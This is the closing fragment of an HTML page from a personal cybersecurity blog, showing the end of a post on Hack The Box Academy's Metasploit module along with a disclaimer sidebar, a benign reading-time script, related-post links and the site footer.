+<p>learn more about exploit coding in the <a href="https://nostarch.com/metasploit">metasploit guide</a></p> </div> </article> <!-- Right Sidebar: Stacked Stats and Related Posts with Toggle --> <div class="hidden lg:flex flex-col gap-6 relative"> <button id="rightSidebarToggle" aria-label="Toggle article info sidebar" title="Toggle article info" class="self-end"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path> </svg> </button> <div id="rightSidebar" class="flex flex-col gap-6 w-80"> <div class="disclaimer-box" data-astro-cid-cukr4w5s><div class="disclaimer-icon" data-astro-cid-cukr4w5s><div class="disclaimer-icon-mark" aria-hidden="true" data-astro-cid-cukr4w5s>!</div></div><div class="disclaimer-content" data-astro-cid-cukr4w5s><h3 class="disclaimer-title" data-astro-cid-cukr4w5s>Side Note</h3><p class="disclaimer-text" data-astro-cid-cukr4w5s>This article contains exact quotes from HTB&#39;s module on metasploit. There may be errors. There will be minimal walkthrough for the questions. You are highly encouraged to try them yourself.</p></div></div> <aside class="hidden lg:block w-full"> <div class="rounded-lg p-4 border border-[var(--accent-light)]" style="background-color: rgba(var(--accent-rgb, 59, 130, 246), 0.05);"> <h3 class="text-lg font-bold mb-4 text-[var(--text-primary)]">Article Stats</h3> <div class="space-y-4" id="articleStats">  <div class="flex items-start gap-3" id="readingTimeContainer" style="display: none;"> <svg class="w-5 h-5 mt-0.5 flex-shrink-0" style="color: var(--accent-color);" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path> </svg> <div> <p class="text-sm text-[var(--text-secondary)]">Reading Time</p> <p class="font-semibold text-[var(--text-primary)]" id="readingTimeValue">- min read</p> </div> </div>  <div class="flex items-start gap-3" id="wordCountContainer" style="display: none;"> <svg class="w-5 h-5 mt-0.5 flex-shrink-0" style="color: var(--accent-color);" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path> </svg> <div> <p class="text-sm text-[var(--text-secondary)]">Word Count</p> <p class="font-semibold text-[var(--text-primary)]" id="wordCountValue">0</p> </div> </div>  <div class="flex items-start gap-3"> <svg class="w-5 h-5 mt-0.5 flex-shrink-0" style="color: var(--accent-color);" fill="none" stroke="currentColor" viewBox="0 0 24 24"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path> </svg> <div> <p class="text-sm text-[var(--text-secondary)]">Published</p> <p class="font-semibold text-[var(--text-primary)]">Dec 24, 2025</p> </div> </div>   </div> </div> </aside> <script type="module">function r(){const e=document.querySelector("article .prose");if(!e)return;const t=(e.textContent||"").split(/\s+/).filter(l=>l.length>0).length,d=Math.ceil(t/200),i=document.getElementById("readingTimeContainer"),a=document.getElementById("wordCountContainer"),n=document.getElementById("readingTimeValue"),o=document.getElementById("wordCountValue");n&&(n.textContent=`${d} min read`,i?.style.removeProperty("display")),o&&(o.textContent=t.toLocaleString(),a?.style.removeProperty("display"))}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",r):r();</script> <aside class="hidden lg:block w-full"> <div class="rounded-lg p-4 border border-[var(--accent-light)]" style="background-color: rgba(var(--accent-rgb, 59, 130, 246), 0.05);"> <h3 class="text-lg font-bold mb-4 text-[var(--text-primary)]">Related Posts</h3> <div class="space-y-3"> <a href="/cyberportfolio/blog/2025-12-17-htb-nmap" class="group block p-3 rounded-lg transition-all duration-200" style="background-color: rgba(var(--accent-rgb, 59, 130, 246), 0.08);"> <p class="font-medium text-sm text-[var(--text-primary)] group-hover:text-[var(--accent-color)] transition-colors line-clamp-2"> Network Enumeration with Nmap - HTB Academy </p> <p class="text-xs text-[var(--text-secondary)] mt-1"> Dec 17, 25 </p> <div class="flex flex-wrap gap-1 mt-2"> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> htb-academy </span><span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> enumeration </span> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-secondary);">
++3 </span> </div> </a><a href="/cyberportfolio/blog/2025-12-18-javascript-deob" class="group block p-3 rounded-lg transition-all duration-200" style="background-color: rgba(var(--accent-rgb, 59, 130, 246), 0.08);"> <p class="font-medium text-sm text-[var(--text-primary)] group-hover:text-[var(--accent-color)] transition-colors line-clamp-2"> JavaScript Deobfuscation - HTB Academy </p> <p class="text-xs text-[var(--text-secondary)] mt-1"> Dec 18, 25 </p> <div class="flex flex-wrap gap-1 mt-2"> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> basics </span><span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> htb-academy </span> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-secondary);">
++6 </span> </div> </a><a href="/cyberportfolio/blog/2025-12-15-awawfuff" class="group block p-3 rounded-lg transition-all duration-200" style="background-color: rgba(var(--accent-rgb, 59, 130, 246), 0.08);"> <p class="font-medium text-sm text-[var(--text-primary)] group-hover:text-[var(--accent-color)] transition-colors line-clamp-2"> Attacking Web Applications With Ffuf - HTB Academy </p> <p class="text-xs text-[var(--text-secondary)] mt-1"> Dec 15, 25 </p> <div class="flex flex-wrap gap-1 mt-2"> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> basics </span><span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-primary);"> web-exploit </span> <span class="text-xs px-2 py-0.5 rounded-full" style="background-color: var(--accent-light); color: var(--text-secondary);">
++6 </span> </div> </a> </div> </div> </aside> </div> </div> </div> </div> </div> </main> <footer class="relative border-t" style="background-color: var(--bg-secondary); border-color: var(--border-primary)"> <div class="mx-auto max-w-6xl px-6 py-12 lg:px-8"> <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-8"> <div class="flex flex-col gap-4"> <h3 class="text-2xl font-bold text-[var(--text-primary)]"> maejikal </h3> <p class="text-base text-[var(--text-secondary)]"> cybersecurity enthusiast, certified nerd. welcome to my cozy corner. </p> <div class="flex gap-x-6"> <a href="mailto:undefined" aria-label="Email" class="transition-colors duration-300 text-[var(--text-secondary)] hover:text-[var(--accent-color)]"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M3 7a2 2 0 0 1 2 -2h14a2 2 0 0 1 2 2v10a2 2 0 0 1 -2 2h-14a2 2 0 0 1 -2 -2v-10z"></path> <path d="M3 7l9 6l9 -6"></path> </svg> </a> <a href="linkedin.com/in/meyling-taing-bab5ab139" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" class="transition-colors duration-300 text-[var(--text-secondary)] hover:text-[var(--accent-color)]"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M8 11v5"></path><path d="M8 8v.01"></path><path d="M12 16v-5"></path> <path d="M16 16v-3a2 2 0 1 0 -4 0"></path> <path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z"></path> </svg> </a> <a target="_blank" rel="noopener noreferrer" aria-label="Twitter" class="transition-colors duration-300 text-[var(--text-secondary)] hover:text-[var(--accent-color)]"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M4 4l11.733 16h4.267l-11.733 -16z"></path> <path d="M4 20l6.768 -6.768m2.46 -2.46l6.772 -6.772"></path> </svg> </a> <a href="https://github.com/maejikal" target="_blank" rel="noopener noreferrer" aria-label="GitHub" class="transition-colors duration-300 text-[var(--text-secondary)] hover:text-[var(--accent-color)]"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-6 w-6"> <path stroke="none" d="M0 0h24v24H0z" fill="none"></path> <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5"></path> </svg> </a> </div> </div> <div class="hidden md:block flex flex-col md:items-end gap-4"> <nav class="flex gap-x-8"> <a href="/cyberportfolio/#about" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors">About</a> <a href="/cyberportfolio/blog" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors">Blog</a> <a href="/cyberportfolio/ctf-writeups" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors">CTFs</a>  <a href="/cyberportfolio/reviews" class="text-sm text-[var(--text-secondary)] hover:text-[var(--text-primary)] transition-colors">Reviews</a> </nav> <p class="text-sm text-[var(--text-secondary)]">
+© 2026 maejikal. All rights reserved.
+</p> </div> </div> </div> <div class="absolute inset-0 -z-10 overflow-hidden text-[var(--border-primary)] opacity-20"> <svg aria-hidden="true" class="absolute bottom-0 left-0 w-full h-24"> <pattern id="footer-pattern" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse"> <path d="M0 50 Q 25 40, 50 50 T 100 50" stroke="currentColor" stroke-width="0.5" fill="none"></path> </pattern> <rect width="100%" height="100%" fill="url(#footer-pattern)"></rect> </svg> </div> </footer> </body></html>
